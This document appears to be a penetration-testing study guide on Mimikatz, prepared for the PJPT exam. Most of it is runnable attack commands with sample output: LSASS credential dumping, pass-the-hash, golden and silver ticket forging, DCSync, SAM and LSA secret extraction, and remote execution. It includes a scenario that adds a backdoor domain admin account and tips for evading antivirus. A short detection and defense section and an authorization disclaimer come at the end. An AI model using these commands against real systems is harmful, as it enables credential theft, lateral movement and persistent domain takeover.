# Mimikatz Overview

## Overview
Mimikatz is a powerful post-exploitation tool used to extract credentials from Windows systems. It's capable of viewing and stealing credentials, generating Kerberos tickets, and performing various advanced attacks against Windows authentication mechanisms.

## What is Mimikatz?

### Primary Functions
- **Tool used to view and steal credentials, generate Kerberos tickets, and leverage attacks**
- **Dump credentials stored in memory** (LSASS process)
- **Advanced Kerberos attacks** - ticket manipulation and generation
- **Pass-the-Hash and related attacks** for lateral movement

### Core Attack Categories
Mimikatz supports numerous attack techniques, including:
- **Credential Dumping** - Extract passwords from memory
- **Pass-the-Hash** - Use NTLM hashes without knowing passwords
- **Over-Pass-the-Hash** - Use NTLM hash to get Kerberos tickets
- **Pass-the-Ticket** - Use stolen Kerberos tickets
- **Silver Ticket** - Forge service tickets
- **Golden Ticket** - Forge TGT tickets for complete domain access

## Getting Started with Mimikatz

### Basic Execution
```cmd
# Download and execute Mimikatz
C:\Users\peterparker\Downloads> mimikatz.exe

# Mimikatz 2.2.0 (x64) banner appears:
.#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
.## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
## \ / ##       > https://blog.gentilkiwi.com/mimikatz
'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
 '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # 
```

### Essential Privilege Escalation
```cmd
# Enable debug privileges (required for memory access)
mimikatz # privilege::debug
Privilege '20' OK

# Check current privileges
mimikatz # privilege::

# If privilege escalation fails, ensure you're running as administrator
# or use token impersonation techniques first
```

## Core Mimikatz Modules

### 1. Credential Dumping (sekurlsa)

#### Basic Credential Extraction
```cmd
# Dump all logon passwords from memory
mimikatz # sekurlsa::logonpasswords

# Expected output format:
Authentication Id : 0 ; 123456 (00000000:0001e240)
Session           : Interactive from 1
User Name         : admin
Domain            : COMPANY
Logon Server      : DC01
Logon Time        : 1/15/2024 10:30:45 AM
SID               : S-1-5-21-1234567890-987654321-1122334455-1001
	msv :
	 [00000003] Primary
	 * Username   : admin
	 * Domain     : COMPANY
	 * NTLM       : a9fdfa038c4b75ebc76dc855dd74f0da
	 * SHA1       : 3fbde5e7f12345678901234567890abcdef12345
	tspkg :
	wdigest :
	 * Username   : admin
	 * Domain     : COMPANY
	 * Password   : MySecretPassword123!
	kerberos :
	 * Username   : admin
	 * Domain     : COMPANY.LOCAL
	 * Password   : MySecretPassword123!
```

#### Targeted Credential Extraction
```cmd
# Dump only NTLM hashes
mimikatz # sekurlsa::msv

# Dump only Kerberos tickets
mimikatz # sekurlsa::kerberos

# Dump only WDigest passwords (if enabled)
mimikatz # sekurlsa::wdigest

# Dump only TsPkg credentials
mimikatz # sekurlsa::tspkg

# Dump credentials for specific process
mimikatz # sekurlsa::process

# Extract credentials from specific LSASS dump file
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### 2. Pass-the-Hash Attacks

#### Basic Pass-the-Hash
```cmd
# Use NTLM hash to authenticate as user
mimikatz # sekurlsa::pth /user:administrator /domain:company.local /ntlm:a9fdfa038c4b75ebc76dc855dd74f0da /run:cmd.exe

# Parameters explained:
# /user: - Target username
# /domain: - Target domain
# /ntlm: - NTLM hash of the user
# /run: - Command to execute with the new context
```

#### Advanced Pass-the-Hash
```cmd
# Pass-the-Hash with specific process
mimikatz # sekurlsa::pth /user:admin /domain:company.local /ntlm:hash /run:powershell.exe

# Pass-the-Hash with custom command
mimikatz # sekurlsa::pth /user:admin /domain:company.local /ntlm:hash /run:"cmd.exe /k whoami"

# Over-Pass-the-Hash (use hash to get Kerberos ticket)
mimikatz # sekurlsa::pth /user:admin /domain:company.local /ntlm:hash /run:cmd.exe
# In new cmd window:
klist
# Request Kerberos authentication to any service
dir \\dc.company.local\c$
```

### 3. Kerberos Attacks

#### Pass-the-Ticket
```cmd
# List current Kerberos tickets
mimikatz # kerberos::list

# Extract all Kerberos tickets to files
mimikatz # kerberos::list /export

# Inject stolen ticket into current session
mimikatz # kerberos::ptt ticket.kirbi

# Clear all tickets from current session
mimikatz # kerberos::purge
```

#### Golden Ticket Attack
```cmd
# Create Golden Ticket (requires krbtgt hash)
mimikatz # kerberos::golden /user:administrator /domain:company.local /sid:S-1-5-21-1234567890-987654321-1122334455 /krbtgt:81d310fa7e5318bf8a2e6c6e1dea26e7 /ptt

# Parameters:
# /user: - Username to impersonate (can be fake)
# /domain: - Target domain
# /sid: - Domain SID (without RID)
# /krbtgt: - krbtgt account NTLM hash
# /ptt: - Pass-the-ticket (inject immediately)

# Alternative: Save to file
mimikatz # kerberos::golden /user:administrator /domain:company.local /sid:S-1-5-21-1234567890-987654321-1122334455 /krbtgt:81d310fa7e5318bf8a2e6c6e1dea26e7 /ticket:golden.kirbi
```

#### Silver Ticket Attack
```cmd
# Create Silver Ticket for specific service
mimikatz # kerberos::golden /user:administrator /domain:company.local /sid:S-1-5-21-1234567890-987654321-1122334455 /target:dc.company.local /service:cifs /rc4:service_account_hash /ptt

# Common services for Silver Tickets:
# /service:cifs - File sharing (most common)
# /service:http - Web services
# /service:rpcss - RPC services
# /service:ldap - LDAP/AD services
# /service:mssqlsvc - SQL Server services
```

### 4. LSA Secrets and SAM Extraction

#### Local SAM Database
```cmd
# Dump local SAM database (requires SYSTEM privileges)
mimikatz # lsadump::sam

# Expected output:
Domain : WORKSTATION
SysKey : 1234567890abcdef1234567890abcdef
Local SID : S-1-5-21-1111111111-2222222222-3333333333

SAMKey : fedcba0987654321fedcba0987654321

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: a9fdfa038c4b75ebc76dc855dd74f0da

RID  : 000001f5 (501)
User : Guest
  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0
```

#### LSA Secrets
```cmd
# Dump LSA secrets
mimikatz # lsadump::secrets

# Cache passwords (if cached logons enabled)
mimikatz # lsadump::cache
```

#### Domain Controller Database (DCSync)
```cmd
# DCSync attack to extract password hashes from DC
mimikatz # lsadump::dcsync /domain:company.local /user:administrator

# Extract specific account
mimikatz # lsadump::dcsync /domain:company.local /user:krbtgt

# Extract all domain hashes (very noisy!)
mimikatz # lsadump::dcsync /domain:company.local /all /csv
```

## Practical Attack Scenarios

### Scenario 1: Basic Credential Dumping
```cmd
# 1. Gain administrator access on target system
# 2. Execute Mimikatz
C:\> mimikatz.exe

# 3. Enable debug privileges
mimikatz # privilege::debug

# 4. Dump all credentials from memory
mimikatz # sekurlsa::logonpasswords

# 5. Extract useful credentials for lateral movement
# Look for:
# - Domain administrator accounts
# - Service accounts
# - Other user passwords in cleartext
```

### Scenario 2: Pass-the-Hash Lateral Movement
```cmd
# 1. Extract NTLM hashes from compromised system
mimikatz # sekurlsa::logonpasswords

# 2. Use administrator hash for lateral movement
mimikatz # sekurlsa::pth /user:administrator /domain:company.local /ntlm:a9fdfa038c4b75ebc76dc855dd74f0da /run:cmd.exe

# 3. In new command window, test access to other systems
C:\> dir \\server01\c$
C:\> dir \\server02\admin$

# 4. Use PsExec or similar to execute commands remotely
C:\> psexec \\server01 cmd.exe
```

### Scenario 3: Golden Ticket Domain Persistence
```cmd
# 1. Compromise Domain Controller or extract krbtgt hash
mimikatz # lsadump::dcsync /domain:company.local /user:krbtgt

# 2. Create Golden Ticket for persistent access
mimikatz # kerberos::golden /user:administrator /domain:company.local /sid:S-1-5-21-1234567890-987654321-1122334455 /krbtgt:extracted_krbtgt_hash /ptt

# 3. Test domain admin access
C:\> dir \\dc.company.local\c$
C:\> net user backdoor P@ssw0rd123 /add /domain
C:\> net group "Domain Admins" backdoor /add /domain
```

## Advanced Techniques

### Memory Dump Analysis
```cmd
# Create LSASS memory dump (alternative to live extraction)
# Using Task Manager, ProcDump, or other tools
procdump.exe -ma lsass.exe lsass.dmp

# Analyze dump with Mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
```

### Evasion Techniques
```cmd
# Use Mimikatz modules individually to reduce AV detection
# Instead of full sekurlsa::logonpasswords, use specific modules:

mimikatz # sekurlsa::msv     # Only MSV credentials
mimikatz # sekurlsa::ssp     # Only SSP credentials  
mimikatz # sekurlsa::livessp # Only Live SSP credentials
```

### Remote Mimikatz Execution
```powershell
# PowerShell wrapper for remote Mimikatz execution
# Invoke-Mimikatz.ps1 (part of PowerSploit)
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords" exit'

# Execute on remote systems
Invoke-Mimikatz -ComputerName Server01 -Command '"sekurlsa::logonpasswords"'
```

## Detection and Defense

### Detecting Mimikatz Usage
```bash
# Common IOCs (Indicators of Compromise):
# 1. Process name: mimikatz.exe
# 2. Command line arguments: privilege::debug, sekurlsa::logonpasswords
# 3. File hashes of known Mimikatz versions
# 4. Memory signatures of Mimikatz modules

# Windows Event Logs to monitor:
# - Event ID 4688: Process creation
# - Event ID 4673: Sensitive privilege use
# - Event ID 4624: Account logon
# - Event ID 10: Process access (Sysmon)
```

### Defensive Measures
```bash
# 1. Enable Windows Defender Credential Guard
# - Protects LSA secrets using virtualization-based security
# - Prevents access to credentials in memory

# 2. Implement Protected Process Light (PPL) for LSASS
# - Makes LSASS harder to access even with admin rights

# 3. Disable WDigest authentication
# - Prevents cleartext password storage in memory
reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 0 /f

# 4. Implement application whitelisting
# - Block execution of unauthorized tools like Mimikatz

# 5. Use LAPS for local administrator passwords
# - Prevents lateral movement using shared local admin accounts
```

## PJPT Exam Tips

### For the PJPT Exam

1. **Essential Mimikatz commands to memorize**:
   ```cmd
   privilege::debug
   sekurlsa::logonpasswords
   sekurlsa::pth /user:admin /domain:company.local /ntlm:hash /run:cmd.exe
   kerberos::list /export
   kerberos::ptt ticket.kirbi
   ```

2. **Common workflow**:
   - Gain admin access → Enable debug privilege → Dump credentials → Use hashes for lateral movement

3. **Key information to extract**:
   - NTLM hashes for Pass-the-Hash
   - Cleartext passwords for direct authentication
   - Kerberos tickets for Pass-the-Ticket
   - Service account credentials

4. **Documentation requirements**:
   - Show privilege escalation to admin/SYSTEM
   - Include Mimikatz command execution
   - Document extracted credentials
   - Demonstrate lateral movement success

5. **Alternative execution methods**:
   - Direct binary execution
   - PowerShell Invoke-Mimikatz
   - Memory dump analysis
   - DCSync from domain controller

6. **Post-exploitation priorities**:
   - Extract krbtgt hash for Golden Tickets
   - Find service accounts with admin rights
   - Document credential scope across domain
   - Establish persistent access mechanisms

---

**Note**: Always ensure proper authorization before using Mimikatz. This tool should only be used in authorized penetration testing scenarios or controlled lab environments. Mimikatz is often flagged by antivirus software, so consider evasion techniques or alternative credential extraction methods when necessary. 